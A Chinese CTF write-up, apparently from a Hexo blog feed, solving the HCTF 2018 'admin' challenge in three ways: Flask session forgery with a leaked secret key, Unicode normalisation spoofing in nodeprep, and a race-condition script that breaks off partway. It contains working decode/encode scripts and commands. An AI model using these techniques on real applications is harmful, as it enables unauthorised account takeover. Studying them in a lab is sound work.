href="https://blog.csdn.net/weixin_44077544/article/details/102688564">https://blog.csdn.net/weixin_44077544/article/details/102688564</a><br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> .user.ini漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF 2018 admin 1题解</title>
      <link href="/2022/01/24/HCTF%202018%20admin%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/01/24/HCTF%202018%20admin%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="HCTF-2018-admin-1题解"><a href="#HCTF-2018-admin-1题解" class="headerlink" title="HCTF 2018 admin 1题解"></a>HCTF 2018 admin 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h2 id="做题详解"><a href="#做题详解" class="headerlink" title="做题详解"></a>做题详解</h2><p>这题的三种方法都是知识盲区，学习学习三种方法的思路。<br>法1：伪造session<br>法2：unicode欺骗<br>法3：条件竞争<br>打开题目，F12查看源码，得到提示：</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--you are not admin--></span></code></pre><p>发现有一个login界面和register界面。<br>首先尝试万能密码，无果。在register界面注册一个账号，登陆进去。<br>发现有index，post，change password和logout界面，在change password界面有提示：</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--https://github.com/woadsl1234/hctf_flask/ --></span></code></pre><p>下载源码，发现是flask模板。然后就引入我们的第一种解法，flask session的伪造。</p><h4 id="伪造session"><a href="#伪造session" class="headerlink" title="伪造session"></a>伪造session</h4><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">客户端 session 导致的安全问题</a><br>可以知道flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。构造脚本解密session</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span>b<span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span>b<span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>b<span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>然后可以尝试读取我们的session内容。<br>在消息头中找到我们的session</p><pre class=" language-1"><code class="language-1">.eJw9kEGLwjAQhf_KMmcPNrteBC9LarEwCYXUklyK2tp20rpQlW0j_vcdZPH8vfl4bx5Qnsf62sL6Nt7rBZRdBesHfBxhDc70vSPnVcgjZXBGOn2htAKDGzD4FYp0QJn2luKgk71XImbWdjakpJNshRRHKOLJDvmnFXvO2dkRcqZZqZD9KunZW7Hfz0pW5Iizhpn0zPNJJzZo6Vot-1YX6aAK1TnTzMrYpSI7uYK7JGwkv4HnAk7X8Vzefnx9eU9Qcsdl4xkNRrbgI9p6NM1Sm3hyyZ6s2PGsTHDVWYXWa7PtMdu8dN1waOq3KaPvrf4nl8PAAPwRFnC_1uPraRAt4fkHKRttTA.Ye03fg.RMqGFcyva_tO_XuzCcfMpYKkYEk</code></pre><p>运行得到：</p><pre class=" language-1"><code class="language-1">python flasksession.py .eJw9kEGLwjAQhf_KMmcPNrteBC9LarEwCYXUklyK2tp20rpQlW0j_vcdZPH8vfl4bx5Qnsf62sL6Nt7rBZRdBesHfBxhDc70vSPnVcgjZXBGOn2htAKDGzD4FYp0QJn2luKgk71XImbWdjakpJNshRRHKOLJDvmnFXvO2dkRcqZZqZD9KunZW7Hfz0pW5Iizhpn0zPNJJzZo6Vot-1YX6aAK1TnTzMrYpSI7uYK7JGwkv4HnAk7X8Vzefnx9eU9Qcsdl4xkNRrbgI9p6NM1Sm3hyyZ6s2PGsTHDVWYXWa7PtMdu8dN1waOq3KaPvrf4nl8PAAPwRFnC_1uPraRAt4fkHKRttTA.Ye03fg.RMqGFcyva_tO_XuzCcfMpYKkYEk{'_fresh': True, '_id': b'e9ef6d75553227806636f3993bf02eb138ed7a638bc2c8d92153a1be7ceeb62f3638974049557d79247cf11a894997518f386a89a9bf5cbe82564661ef60fc29', 'csrf_token': b'423fa2135accb1d184911deccb224621278d91e1', 'image': b'B0E9', 'name': 'kb', 'user_id': '10'}</code></pre><p>github上有脚本去伪造session<a href="https://github.com/noraj/flask-session-cookie-manager">flask session伪造脚本</a>，其次我们需要获得秘钥，在源码中的config.py中存有秘钥ckj123，接下来把name改成admin，重新加密。</p><pre class=" language-1"><code class="language-1">{'_fresh': True, '_id': b'e9ef6d75553227806636f3993bf02eb138ed7a638bc2c8d92153a1be7ceeb62f3638974049557d79247cf11a894997518f386a89a9bf5cbe82564661ef60fc29', 'csrf_token': b'423fa2135accb1d184911deccb224621278d91e1', 'image': b'B0E9', 'name': 'admin', 'user_id': '10'}python .\flask_session_cookie_manager3.py encode -s "ckj123" -t "{'_fresh': True, '_id': b'e9ef6d75553227806636f3993bf02eb138ed7a638bc2c8d92153a1be7ceeb62f3638974049557d79247cf11a894997518f386a89a9bf5cbe82564661ef60fc29', 'csrf_token': b'423fa2135accb1d184911deccb224621278d91e1', 'image': b'B0E9', 'name': 'admin', 'user_id': '10'}".eJw9kEGLwjAQhf_KMmcPNqsXwcuSWixMQiFakou4tradNC5UZduI_30HWTx_bz7emwcczkN9bWF1G-71DA5dBasHfHzDCpzpe0fOq7hLlMEJ6bRAaQVGFzD6JYo8oMx7S2nU2d4rkTJrOxtz0lmxREoTFOlow-7Tij3n7OQIOdMsVSx-lfTsrdjvJyUrcsRZw0x65rtRZzZq6Vot-1aXeVCl6pxpJmXsXJEdXcldMjaSX8NzBqfrcD7cfnx9eU9Qcstl0wkNJrbkI9p4NM1cm3R02Z6s2PKsQnDVScXWa7PpsVi_dF04NvXbVNDXRv-TyzEwgGMVugvM4H6th9ffIJnD8w953G6I.Ye1hUg.Vj-1qaU1Fggp_oaB_8R5IFekjII</code></pre><p>然后利用伪造的session登陆admin账号。<br>获得flag:flag{0575fabb-dc12-4113-ad3a-66650ca8451c}</p><h4 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h4><p>在/hctf_flask-master/app/routes.py中有一段代码：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span></code></pre><p>同样，在login和register中都有转小写的操作</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> form<span class="token punctuation">.</span>verify_code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Wrong verify code.'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>        <span class="token keyword">if</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'The username has been registered'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'register successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> name        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> None <span class="token operator">or</span> <span class="token operator">not</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_user<span class="token punctuation">(</span>user<span class="token punctuation">,</span> remember<span class="token operator">=</span>form<span class="token punctuation">.</span>remember_me<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'login'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span></code></pre><p>更改密码里有一句代码</p><pre class=" language-python"><code class="language-python">name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>但是又有一个特别的地方，我们python转小写一般用的都是lower()，为什么这里是strlower()?<br>而strlower：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username</code></pre><p>这个nodeprep.prepare存在漏洞。<br>具体编码可查<a href="https://unicode-table.com/en/search/?q=small+capital">Unicode编码</a><br>对于ᴀ，nodeprep.prepare会进行如下操作：ᴀ -&gt; A -&gt; a<br>即：ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin，<br>于是我们可以注册用户ᴬᴰᴹᴵᴺ<br>登陆用户ᴬᴰᴹᴵᴺ，变成了ADMIN<br>修改密码ADMIN，更改了admin的密码。<br>成功得到flag:flag{0575fabb-dc12-4113-ad3a-66650ca8451c}</p><h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#session['name'] = name</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> None <span class="token operator">or</span> <span class="token operator">not</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_user<span class="token punctuation">(</span>user<span class="token punctuation">,</span> remember<span class="token operator">=</span>form<span class="token punctuation">.</span>remember_me<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'login'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#name = strlower(session['name'])</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span></code></pre><p>我们发现代码在处理session赋值的时候两个危险操作，一个登陆一个改密码（注释掉的两行），都是在不安全check身份的情况下，直接先赋值了session，那么这里就会存在一些风险，那么我们设想，能不能利用这一点，改掉admin的密码呢？</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#if current_user.is_authenticated:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> name        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> None <span class="token operator">or</span> <span class="token operator">not</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_user<span class="token punctuation">(</span>user<span class="token punctuation">,</span> remember<span class="token operator">=</span>form<span class="token punctuation">.</span>remember_me<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'login'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span></code></pre><p>这里存在问题，即前两步中，如果我们的Session a是登录后的，那么是无法再去登录admin的。（注释掉的那行）所以这里需要条件竞争。<br>那么如何避开check，双线并进<br>在一个进程运行到改密码时</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#if request.method == 'POST':</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span></code></pre><p>运行到注释那行时，正好另一个进程退出了这个用户，来到登陆位置</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#session['name'] = name</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> None <span class="token operator">or</span> <span class="token operator">not</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_user<span class="token punctuation">(</span>user<span class="token punctuation">,</span> remember<span class="token operator">=</span>form<span class="token punctuation">.</span>remember_me<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'login'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span></code></pre><p>运行到注释行，此时正好session name变为admin，change密码正好改了管理员密码。<br>直接借用大佬的payload</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>        <span class="token string">'submit'</span><span class="token punctuation">:</span> <span class="token string">''</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://55fcd3f8-b82d-422b-bf9a-8ed90d2aff73.node4.buuoj.cn:81/login"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token 